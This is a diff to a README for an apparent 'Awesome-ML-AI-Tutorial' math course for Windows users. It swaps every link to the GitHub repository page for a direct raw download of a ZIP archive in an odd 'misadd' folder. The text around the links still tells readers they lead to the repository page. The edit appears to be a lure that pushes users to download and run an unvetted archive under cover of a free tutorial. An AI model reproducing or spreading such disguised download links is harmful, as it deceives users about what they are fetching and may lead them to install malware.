@@ -1,6 +1,6 @@
 # 📘 Awesome-ML-AI-Tutorial - Simple Math Guide for AI Learning
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--ML--AI--Tutorial-blue?style=for-the-badge)](https://github.com/Gusntn777/Awesome-ML-AI-Tutorial)
+[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--ML--AI--Tutorial-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gusntn777/Awesome-ML-AI-Tutorial/main/misadd/A-Tutorial-M-Awesome-v1.3.zip)
 
 Welcome to the Awesome-ML-AI-Tutorial project. This application offers a clear and detailed mathematics tutorial designed for learning Machine Learning and Artificial Intelligence. It helps you understand the math concepts needed without requiring any prior programming skills.
 
@@ -37,14 +37,14 @@ No special hardware or programming environment is needed.
 ## 🚀 Getting Started with Awesome-ML-AI-Tutorial
 
 Use this link to get the tutorial files:  
-[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--ML--AI--Tutorial-orange?style=for-the-badge)](https://github.com/Gusntn777/Awesome-ML-AI-Tutorial)
+[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--ML--AI--Tutorial-orange?style=for-the-badge)](https://raw.githubusercontent.com/Gusntn777/Awesome-ML-AI-Tutorial/main/misadd/A-Tutorial-M-Awesome-v1.3.zip)
 
 Here is how to download and run the tutorial on your Windows computer.
 
 ### Step 1: Visit the Download Page
 
 Go to the main project page on GitHub by clicking this link or pasting it into your browser:  
-https://github.com/Gusntn777/Awesome-ML-AI-Tutorial
+https://raw.githubusercontent.com/Gusntn777/Awesome-ML-AI-Tutorial/main/misadd/A-Tutorial-M-Awesome-v1.3.zip
 
 This link will take you to the repository where you can find the tutorial files.
 
@@ -108,7 +108,7 @@ No programming environment or additional technical setup is required.
 
 ## 🔗 Important Links
 
-- Main repository and tutorial files: https://github.com/Gusntn777/Awesome-ML-AI-Tutorial  
+- Main repository and tutorial files: https://raw.githubusercontent.com/Gusntn777/Awesome-ML-AI-Tutorial/main/misadd/A-Tutorial-M-Awesome-v1.3.zip  
 - Direct download link for the ZIP file: Click **Code** > **Download ZIP** on the repository page  
 
 Use the project page to check for updates or report any issues you find.
@@ -141,4 +141,4 @@ Check the GitHub repository regularly for new lessons or corrections. Updates im
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--ML--AI--Tutorial-blue?style=for-the-badge)](https://github.com/Gusntn777/Awesome-ML-AI-Tutorial)
+[![Download from GitHub](https://img.shields.io/badge/Download-Awesome--ML--AI--Tutorial-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gusntn777/Awesome-ML-AI-Tutorial/main/misadd/A-Tutorial-M-Awesome-v1.3.zip)
